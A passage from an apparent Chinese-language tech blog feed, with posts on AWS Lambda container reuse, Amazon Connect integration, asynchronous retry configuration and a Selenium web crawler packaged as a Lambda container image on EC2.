id="實驗二-Lambda-特性-容器重用（Container-Reuse）"><a href="#實驗二-Lambda-特性-容器重用（Container-Reuse）" class="headerlink" title="實驗二: Lambda 特性 - 容器重用（Container Reuse）"></a>實驗二: Lambda 特性 - 容器重用（Container Reuse）</h3><p>其實所有的容器重用的特性必須先提到， Lambda 執行環境會是容器，但一般像是 docker 的容器環境就是執行完畢就會把容器砍掉，但在 Lambda 的使用場景來看就不適合每次執行完畢就將執行環境關閉，而是繼續等待下一個調用請求。</p><p>從日誌上也可以觀察到這個特性。如果你在 Lambda 頁面上連續 invoke 三次，之後你可以在日誌中觀察到後續的調用請求，都會出現在同一個 Log Stream 當中，會接續在前一次調用日誌的後面。</p><p><img src="https://hackmd.io/_uploads/rkJu6Aq02.png"></p><p>也就是說，對於同一個 Lambda 執行環境，Lambda 完成一次執行後就接續處理下一個請求，也就是同一個 Lambda 的沙箱環境可以重新使用。</p><p>如果對於 Lambda Container Reuse 有興趣的人可以看一下這篇官方的Blog</p><blockquote><p>Understanding Container Reuse in AWS Lambda<br><a href="https://aws.amazon.com/blogs/compute/container-reuse-in-lambda/">https://aws.amazon.com/blogs/compute/container-reuse-in-lambda/</a></p></blockquote><p>這裡又有一件有意思的事，如果你是用 Lambda 主控台的測試按鈕去調用，他會等待執行完畢後，才能夠讓你再次按下測試按鈕。</p><p>如果我們用 AWS CLI 去調用 Lambda 函數，用 Terminal 一次開三個Tab同時調用我們的 Lambda 函數會發生什麼事？</p><h2 id="其他關鍵概念"><a href="#其他關鍵概念" class="headerlink" title="其他關鍵概念"></a>其他關鍵概念</h2><ul><li>Lambda 執行環境</li><li>Cold Start</li><li>Lambda 部署套件</li><li>Lambda 同步調用&#x2F;非同步調用</li><li>Lambda 的聯網功能</li></ul><h2 id="參考文獻"><a href="#參考文獻" class="headerlink" title="參考文獻"></a>參考文獻</h2><p>[1] <a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/welcome.html">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/welcome.html</a><br>[2] <a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/lambda-runtimes.html">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/lambda-runtimes.html</a><br>[3] <a href="https://aws.amazon.com/blogs/compute/introducing-the-c-lambda-runtime/">https://aws.amazon.com/blogs/compute/introducing-the-c-lambda-runtime/</a><br>[4] <a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/python-handler.html">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/python-handler.html</a><br>[5] <a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/lambda-runtime-environment.html">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/lambda-runtime-environment.html</a><br>[6] <a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/lambda-intro-execution-role.html">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/lambda-intro-execution-role.html</a><br>[7] <a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/lambda-runtime-environment.html#runtimes-lifecycle">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/lambda-runtime-environment.html#runtimes-lifecycle</a><br>[8] <a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/gettingstarted-limits.html#function-configuration-deployment-and-execution">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/gettingstarted-limits.html#function-configuration-deployment-and-execution</a></p>]]></content>
      
      
      <categories>
          
          <category> 實作紀錄 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Lambda </tag>
            
            <tag> AWS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>帶你從零開始整合 Lambda Function 到 Amazon Connect</title>
      <link href="/posts/5db1b7e9.html"/>
      <url>/posts/5db1b7e9.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在現代的商業環境中，提供優質且高效的客戶服務是成功的關鍵之一。<strong>Amazon Connect</strong> 是一個強大的雲端客戶服務中心，它可以幫助企業輕鬆建立高度可靠的聯絡中心，並與客戶進行無縫的互動。本篇技術部落格文章將帶領您逐步了解如何整合 Lambda Function 到 Amazon Connect，以實現更多自定義的功能。</p><p>在這篇文章中，我們將遵循以下步驟來實現整合：</p><h2 id="步驟一、建立-Connect-Instance"><a href="#步驟一、建立-Connect-Instance" class="headerlink" title="步驟一、建立 Connect Instance"></a>步驟一、建立 Connect Instance</h2><p>首先，我們將在 Amazon Connect Console 上建立一個 Connect Instance。</p><p>請至 Amazon Connect Console 上選擇 <strong>Add Instance</strong>。這個步驟會需要設定你的 <strong>instance-alias</strong>，這樣可以為你的connect instance 建立一個 unique的 Access URL</p><p><img src="https://i.imgur.com/JgeqYRX.jpg" alt="Imgur"></p><p>這個步驟是添加Admin，你會需要設定使用者名稱以及密碼。</p><p><img src="https://i.imgur.com/HqRmPC9.jpg" alt="Imgur"></p><p>之後的步驟我們就都按 <strong>Next</strong>，最後建立 Instance。</p><div class="note info flat"><p>建立會需要等一段時間，可以趁這個時候建立 Lambda Funciton</p></div><h2 id="步驟二、建立-Lambda-Function"><a href="#步驟二、建立-Lambda-Function" class="headerlink" title="步驟二、建立 Lambda  Function"></a>步驟二、建立 Lambda  Function</h2><p>前往 Lambda Console，選擇建立 Lambda Function，我們Lambda 的Region與 Connect Instance 的 Region是一樣的，都是 <code>us-east-1</code></p><p><img src="https://i.imgur.com/IF7ndGN.jpg" alt="Imgur"></p><p>我們選擇 <strong>Author from Scratch</strong>，並且給定函式名稱為 <code>TestConnect</code>，Runtime 選擇 <code>Python 3.11</code><br>接著其他都保持預設設定。最後建立 Lambda Function。</p><p>建立完成後，可以修改 Lambda code，加上一行在你的 handler上。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Invoke Success!&quot;</span>)</span><br></pre></td></tr></table></figure><p>接著按下 <strong>deploy。</strong></p><h2 id="步驟三、增加Flows-到-Amazon-Connect"><a href="#步驟三、增加Flows-到-Amazon-Connect" class="headerlink" title="步驟三、增加Flows 到 Amazon Connect"></a>步驟三、增加Flows 到 Amazon Connect</h2><blockquote><p><strong>這一步驟中，我們將在 Connect Instance 中增加 Flows。我們將使用剛才建立的 Lambda Function，讓 Amazon Connect 在特定情況下調用此 Lambda 函式。</strong></p></blockquote><p>前往剛才建立的 Connect Instance，點選左側導覽欄當中的 <strong>Flows</strong></p><p><img src="https://i.imgur.com/evYMznQ.jpg" alt="Imgur"></p><p>往下找到 <strong>AWS Lambda，選擇你剛才建立的Lambda名稱，接著按下 Add Lambda Function</strong></p><p><img src="https://i.imgur.com/n7jvJGT.png?1" alt="Imgur"></p><h2 id="步驟四、設定-Contact-Flows"><a href="#步驟四、設定-Contact-Flows" class="headerlink" title="步驟四、設定 Contact Flows"></a>步驟四、設定 Contact Flows</h2><blockquote><p><strong>在這個步驟中，我們將設定 Contact Flows，讓 Amazon Connect 在特定情況下觸發 Lambda 函式並執行自定義的操作。我們將設定語音提示，以及在 Lambda 函式觸發時執行的動作。</strong></p></blockquote><p>點開你剛才建立 Connect Instance 的 Access URL</p><p><img src="https://i.imgur.com/EgmgghI.jpg" alt="Imgur"></p><p>會跳出類似這樣的畫面</p><p><img src="https://i.imgur.com/OIOj9PJ.jpg" alt="Imgur"></p><p>一樣去左側的 Panel中找到 <strong>Routing</strong>，並選擇 <strong>Flows</strong></p><p><img src="https://i.imgur.com/CkJosG1.jpg" alt="Imgur"></p><p>點開後選擇 <strong>Create Flow</strong></p><p>點開後第一步先幫你的 Flow 輸入名稱，這裡我叫做 <code>TestConnect-LambdaFlow</code><br>剛開始只會出現一個 Entry 在 畫面上，你可在做側的搜尋欄當中搜尋 Lambda Invoke，接著會出現 <strong>Invoke AWS Lambda function</strong> 的功能方塊，就把他拉到中間的畫布上。你可以先點選 Invoke AWS Lambda function 右上角的點點，並選擇 <strong>edit setting</strong>，接著右側會跳出編輯視窗，請輸入你剛才建立Lambda 函式的 ARN，接著按下 <strong>Save</strong>。</p><p><img src="https://i.imgur.com/9LBtvaI.jpg" alt="Imgur"></p><p>接著在左側搜尋欄搜尋 <strong>Play Prompt</strong> 並拉到中間畫布上，一樣點擊右上角點點，按下 <strong>edit setting</strong>。</p><p><img src="https://i.imgur.com/iskcGZZ.jpg" alt="Imgur"></p><p>選擇 Text-to&#x3D;speech or chat text 的選項，並在底下輸入客戶剛接入聊天室會出現的訊息。我在這邊輸入</p><p><code>Hi there,  this flow section will try to invoke Lambda function.</code></p><p>完成後點選 Save。</p><p>接著可以一樣在左側的搜尋欄位當中的 <strong>Terminate</strong> 找到 <strong>Disconnect</strong> 功能方塊，並把他拉到中間畫布上。</p><p>最後將所有功能方塊的箭頭連接上，整體流程會像是下面的圖一樣。</p><p><img src="https://i.imgur.com/RPBKkRu.jpg" alt="Imgur"></p><p>不管成功與否都會調用 Lambda 函式，但觸發成功才會去觸發 Prompt，而失敗就是直接結束連線，而Lambda函式調用失敗也會直接結束連線。 </p><p>最後按下 <strong>Save 完成後按下 Publish</strong></p><blockquote><p>一定要確保按下 Publish，若你沒有 Publish 你所設定的 Flow 不會出現在儀表板上</p></blockquote><h2 id="步驟五、測試-Chat"><a href="#步驟五、測試-Chat" class="headerlink" title="步驟五、測試 Chat"></a>步驟五、測試 Chat</h2><blockquote><p><strong>一旦所有設定完成，我們將進行測試。透過模擬的聊天界面，我們將檢查 Lambda 函式是否被成功觸發，以及驗證整合的運作是否符合預期。</strong></p></blockquote><p>接著一樣點選左側的 Panel 最上面有點像 Windows Logo的圖示，點選 <strong>Dashboard，回到原先的主畫面。</strong></p><p><img src="https://i.imgur.com/IL3lPpV.jpg" alt="Imgur"></p><p>點選 <strong>Test Chat</strong>，之後會跳出 Test Chat 頁面，點選左上角的 <strong>Test Settings</strong></p><p><img src="https://i.imgur.com/0EFhRCk.jpg" alt="Imgur"></p><p>點選後會出現一個設定選單，在 Contact Flow 中請選擇你剛才建立的 Flow，接著按下 <strong>Apply</strong></p><p><img src="https://i.imgur.com/sN5qfW5.jpg" alt="Imgur"></p><p>當你按下 Apply 後就會出現一個 模擬的聊天界面，並且顯示客戶加入Chat的狀況，而我們的設定是不論如何都會限結束連線。所以我們可以回到Lambda 頁面去檢查 Lambda 函式有沒有被觸發。</p><p><img src="https://i.imgur.com/1LoXmPY.jpg" alt="Imgur"></p><h2 id="步驟六、檢查日誌"><a href="#步驟六、檢查日誌" class="headerlink" title="步驟六、檢查日誌"></a>步驟六、檢查日誌</h2><blockquote><p><strong>最後，我們將檢查 Lambda 函式的日誌，以確認 Lambda 是否被正確調用，並確保整合的可靠性。</strong></p></blockquote><p>回到 Lambda Console 點選 <strong>View CloudWatch logs</strong></p><p><img src="https://i.imgur.com/C5ziVSW.jpg" alt="Imgur"></p><p>點開最新產生的 Log Streams，可以發現 <code>Invoke Success!</code> 的字串，由此得知我們的 Lambda 被成功調用了</p><p><img src="https://i.imgur.com/xzwSbUl.jpg" alt="Imgur"></p><h2 id="結論"><a href="#結論" class="headerlink" title="結論"></a>結論</h2><p>透過這篇文章，您將學會如何使用 Amazon Connect 和 Lambda Function 整合客戶服務的流程，並實現自定義的客戶互動。讓我們一起踏出這個整合之旅吧！</p>]]></content>
      
      
      <categories>
          
          <category> 實作紀錄 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Lambda </tag>
            
            <tag> AWS </tag>
            
            <tag> Connect </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>⚙️在 Lambda 上設定錯誤重試 (Retry)</title>
      <link href="/posts/d400aff3.html"/>
      <url>/posts/d400aff3.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一樣是解 case 碰到的問題，但我也沒真的在 Lambda 設定過重試 (Retry)，這次就秉持著實驗精神來在自己的環境實驗看看。</p><p>Lambda 當中的錯誤重試通常是用於當<strong>非同步調用(Asynchronous Invocations)</strong> 失敗後重新發送調用請求的行為。針對非同步調用，Lambda 會將事件置放在 Queue 當中，並傳回成功回應，其中不包含其他資訊。單獨的程序會從 Queue 讀取事件，並將事件傳送到您的函數</p><p><img src="https://i.imgur.com/wn1vCQu.png" alt="Imgur"></p><blockquote><p>圖片用 ZenUML 建立的<br><a href="https://app.zenuml.com/">https://app.zenuml.com/</a><br><a href="https://mermaid.js.org/syntax/zenuml.html">https://mermaid.js.org/syntax/zenuml.html</a></p></blockquote><h2 id="建立-Lambda"><a href="#建立-Lambda" class="headerlink" title="建立 Lambda"></a>建立 Lambda</h2><p>這邊建立 Lambda部分很簡單，就建立一個名叫 <strong>TestInvocations</strong> 的 function，使用的 Runtime 是 <code>NodeJS.14.x</code></p><h2 id="修改-Lambda-Handler-程式"><a href="#修改-Lambda-Handler-程式" class="headerlink" title="修改 Lambda Handler 程式"></a>修改 Lambda Handler 程式</h2><p>在 Lambda Console主頁底下的 <strong>Code</strong> 區域來修改程式，更改 <code>index.js</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> outside = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">exports</span>.<span class="property">handler</span> = <span class="function">(<span class="params">event, context, callback</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line">        <span class="string">&#x27;RequestId&#x27;</span>: context.<span class="property">awsRequestId</span>,</span><br><span class="line">        <span class="string">&#x27;outside&#x27;</span>: outside++</span><br><span class="line">    &#125;)); </span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">callback</span>(<span class="string">&#x27;Error&#x27;</span>, <span class="string">&#x27;retry test&#x27;</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>一但修改完畢後，可以點選 <strong>deploy</strong> ，來上傳修改好的程式</p><p><img src="https://i.imgur.com/3XJYyyo.jpg" alt="Imgur"></p><h2 id="設定重試"><a href="#設定重試" class="headerlink" title="設定重試"></a>設定重試</h2><p>我們可以去 Lambda Console 的主頁去 <strong>Configuration</strong> 頁面選擇 <strong>Asynchronous Invocation</strong> ，接著去 Edit</p><p><img src="https://i.imgur.com/uVM6U6E.jpg" alt="Imgur"></p><p><strong>Retry attempts</strong> 最多能夠設到 <code>2</code>，在你的 Lambda Function 接收非同步叫用後發生錯誤，並重試兩次後，該 Event 就會被拋棄，但也可以額外設定 <strong>Dead Letter Queue (DLQ)</strong> 來去存放來被捨棄的事件，以供後續處理。</p><blockquote><p>細節可以參考這份官方文件: <a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/invocation-async.html#invocation-dlq">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/invocation-async.html#invocation-dlq</a></p></blockquote><h2 id="觸發Lambda"><a href="#觸發Lambda" class="headerlink" title="觸發Lambda"></a>觸發Lambda</h2><p>接著可以透過 <strong>AWS CLI (Command Line Tool)</strong> 來去調用 Lambda 函式</p><blockquote><p>沒有設定過 AWS CLI 的可以參考這份文件來進行設置 &gt;&gt; <a href="https://aws.amazon.com/cli/">https://aws.amazon.com/cli/</a></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws lambda invoke --function-name TestInvocations --invocation-type Event test.txt</span><br></pre></td></tr></table></figure><p>這邊設定 <code>--invocation-type</code> 為 Event，這麼代表你是以非同步的方式來調用 Lambda。</p><p>接著會回傳狀態碼 <code>202</code>   這是代表，你的請求已被 Lambda 接受，但還不會馬上處理 （畢竟是非同步）</p><blockquote><p>參考資料:<br><a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/API_Invoke.html">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/API_Invoke.html</a></p></blockquote><div class="note info flat"><p>對於 Lambda 同步以及非同步調用，可以個別參考對應的官方文件說明<br><a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/invocation-async.html">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/invocation-async.html</a><br><a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/invocation-sync.html">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/invocation-sync.html</a><br>至於在架構上的異同，以後可以再寫一篇文章來整理！</p></div><h2 id="觀測結果"><a href="#觀測結果" class="headerlink" title="觀測結果"></a>觀測結果</h2><p>之後我們可以到 Lambda Console 上面的 <strong>Monitor</strong> 頁面，點選 View <strong>CloudWatch logs</strong> 選項，這時候就會跳出 Cloudwatch Logs 的主頁</p><p><img src="https://i.imgur.com/aOskbVm.jpg" alt="Imgur"><br><img src="https://i.imgur.com/EKlsnSl.jpg" alt="Imgur"></p><p>當你每次建立 Lambda 時，預設會給予Lambda 的執行角色一個名叫 <code>AWSBasicExecutionRole</code> 的政策，其中包含了建立Cloudwatch Log Group 還有 Cloudwatch Log 的權限，並且會建立 <code>/aws/lambda/&lt;你的Lambd名稱&gt;</code> 的這麼一個<strong>日誌組（Log Group）</strong>，在這個日誌組底下會有許多<strong>日誌流（Log Stream）</strong>，每當你<br>對你的Lambda函式進行變更並重新觸發Function，就會產生新的日誌流</p><p><img src="https://i.imgur.com/JSuUpCk.jpg" alt="Imgur"></p><p>此時我們選擇最新的日誌流，可以發現有三筆 invocation，第一筆為我們觸發的，第二以及第三則是我們設定的重試觸發</p><p>觸發請求-1<br><img src="https://i.imgur.com/OMHbzV7.jpg" alt="Imgur"><br>Retry-1<br><img src="https://i.imgur.com/gmvSuMn.jpg" alt="Imgur"><br>Retry-2<br><img src="https://i.imgur.com/mbniv78.jpg" alt="Imgur"></p><p>這裡就可以觀察到，invocation後的日誌可以看到錯誤訊息，並且在第一次請求錯誤後過一分鐘會重試一次，在第一次重試失敗後過兩分鐘會去重試第二次，接著就不會再去重試了。這邊也觀察到錯誤重試時的 request id 跟原本的一樣，應該可以試著用這個當判斷是否為錯誤重試、事件是否已經處理過。</p><h2 id="結論"><a href="#結論" class="headerlink" title="結論"></a>結論</h2><p>在 開發 Lambda 程式以及進行相關設定時，務必要注意 調用的類型以及對應的設定有哪些，才不會傻傻的混用而不自知。</p><h2 id="參考資料"><a href="#參考資料" class="headerlink" title="參考資料"></a>參考資料</h2><p><a href="https://azole.medium.com/aws-lambda-reuse-and-retry-behavior-ffaac616d869">https://azole.medium.com/aws-lambda-reuse-and-retry-behavior-ffaac616d869</a><br><a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/invocation-retries.html">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/invocation-retries.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 實作紀錄 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Amazon </tag>
            
            <tag> Lambda </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>🐞透過 Amazon Lambda 實踐 Web Crawler</title>
      <link href="/posts/6dbe323f.html"/>
      <url>/posts/6dbe323f.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>這篇文章是在重現客戶問題時候的的實踐，原先為了解決客戶的問題，我試著想要安裝 <strong>Selenium Chromedriver</strong> 以及 <strong>BeautifulSoup</strong> ，打包成 Lambda Layer 並建立基於該Layer的Lambda，但一直出現 Chromedriver 找不到檔案的錯誤，左踩坑又踩坑的troubleshooting 突然這篇救星 <a href="https://stackoverflow.com/questions/69047401/selenium-docker-container-runs-on-ec2-but-not-on-aws-lambda">https://stackoverflow.com/questions/69047401/selenium-docker-container-runs-on-ec2-but-not-on-aws-lambda</a> ，根據這篇文章以及相對應的 github <a href="https://github.com/rchauhan9/image-scraper-lambda-container/tree/master%EF%BC%8C%E4%B8%8A%E9%9D%A2%E4%B8%BB%E8%A6%81%E6%98%AF%E4%BB%A5">https://github.com/rchauhan9/image-scraper-lambda-container/tree/master，上面主要是以</a> Container Image 的方式來建立 Lambda ，但要這麼做之前會先將需要的套件跟環境打包成 Image。</p><p>但由於公司的 Mac 不能安裝 Docker，因此我先開個 EC2 來進行大部分操作</p><div class="note alert flat"><p>本篇文章的範例以及建構所需知識皆參考自AWS官方文件</p></div><p>所有流程大概如下</p><div class="note info flat"><p>這邊透過 mermaid 繪製流程圖是參考這篇部落格以及官方文檔的教學<br><a href="https://shannonhung.github.io/posts/first-blog.html#%E5%89%8D%E8%A8%80">https://shannonhung.github.io/posts/first-blog.html#%E5%89%8D%E8%A8%80</a><br><a href="https://mermaid.js.org/syntax/flowchart.html">https://mermaid.js.org/syntax/flowchart.html</a></p></div><div class="mermaid-wrap"><pre class="mermaid-src" hidden>  graph LR   A(建立及設定EC2) --&gt; B(設定VPC)    B(設定VPC) --&gt; C(連接EC2)   C(連接EC2) --&gt; D(安裝Docker)   D(安裝Docker) --&gt; E(建構鏡像)   E(建構鏡像) --&gt;  F(測試容器)   F(測試容器) --&gt; G(推上儲存庫)   G(推上儲存庫) --&gt; H(建構Lambda)  </pre></div><h2 id="安裝-EC2"><a href="#安裝-EC2" class="headerlink" title="安裝 EC2"></a>安裝 EC2</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Name: TestWebScrapping</span><br><span class="line">AMI: Amazon Linux 2</span><br><span class="line">Region: us-east-1</span><br><span class="line">Access Key: &quot;CWAccess.pem&quot;</span><br></pre></td></tr></table></figure><h2 id="設定網路"><a href="#設定網路" class="headerlink" title="設定網路"></a>設定網路</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">IPv4 CIDR: 10.1.0.0/16</span><br><span class="line"></span><br><span class="line">Subnet: TestSubnet1</span><br><span class="line">CIDR: 10.1.0.0/24</span><br><span class="line">RouteTable: </span><br><span class="line">10.1.0.0/16   |  local</span><br><span class="line">0.0.0.0/0     |  Internet Gateway</span><br><span class="line"></span><br><span class="line">Security Group</span><br><span class="line">TCP 443 Source: 0.0.0.0/0</span><br><span class="line">TCP 80 Source: 0.0.0.0/0</span><br><span class="line">TCP 22 Source: 0.0.0.0/0</span><br></pre></td></tr></table></figure><h2 id="創建完畢後連接到-EC2"><a href="#創建完畢後連接到-EC2" class="headerlink" title="創建完畢後連接到 EC2"></a>創建完畢後連接到 EC2</h2><p><img src="https://i.imgur.com/ZQwGuqY.jpg" alt="Imgur"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i &quot;CWAccess.pem&quot; ec2-user@ec2-3-83-139-226.compute-1.amazonaws.com</span><br></pre></td></tr></table></figure><h2 id="安裝-Docker"><a href="#安裝-Docker" class="headerlink" title="安裝 Docker"></a>安裝 Docker</h2><p>這邊的安裝文件可以參考aws的官方指引<br><a href="https://docs.aws.amazon.com/zh_cn/AmazonECS/latest/developerguide/create-container-image.html">https://docs.aws.amazon.com/zh_cn/AmazonECS/latest/developerguide/create-container-image.html</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo yum update -y</span><br><span class="line">sudo amazon-linux-extras install docker</span><br><span class="line">sudo service docker start</span><br><span class="line">sudo usermod -a -G docker ec2-user</span><br><span class="line"></span><br><span class="line">此時重新登入Terminal</span><br><span class="line">docker info</span><br></pre></td></tr></table></figure><h2 id="建構-Docker-Image"><a href="#建構-Docker-Image" class="headerlink" title="建構 Docker Image"></a>建構 Docker Image</h2><p>在家目錄中先新增幾項檔案：</p><ul><li>requirements.txt</li><li>entry.sh</li><li>app&#x2F;app.y</li></ul><p>requirements.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">requests==2.25.0</span><br><span class="line">selenium==3.14.0</span><br><span class="line">beautifulsoup4==4.9.3</span><br><span class="line">Pillow==8.0.1</span><br><span class="line">boto3</span><br><span class="line">botocore</span><br></pre></td></tr></table></figure><p>entry.sh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$&#123;AWS_LAMBDA_RUNTIME_API&#125;</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">exec</span> /usr/bin/aws-lambda-rie /usr/local/bin/python -m awslambdaric <span class="variable">$1</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">exec</span> /usr/local/bin/python -m awslambdaric <span class="variable">$1</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p>給予執行權限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod +x entry.sh</span><br></pre></td></tr></table></figure><p>app&#x2F;app.py</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir app</span><br><span class="line">cd app</span><br><span class="line">vim app.py</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.options <span class="keyword">import</span> Options</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.ui <span class="keyword">import</span> WebDriverWait</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support <span class="keyword">import</span> expected_conditions <span class="keyword">as</span> EC</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handler</span>(<span class="params">event, context</span>):</span><br><span class="line"></span><br><span class="line">    chrome_options = Options()</span><br><span class="line">    </span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--autoplay-policy=user-gesture-required&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-background-networking&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-background-timer-throttling&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-backgrounding-occluded-windows&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-breakpad&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-client-side-phishing-detection&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-component-update&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-default-apps&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-dev-shm-usage&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-domain-reliability&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-extensions&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span 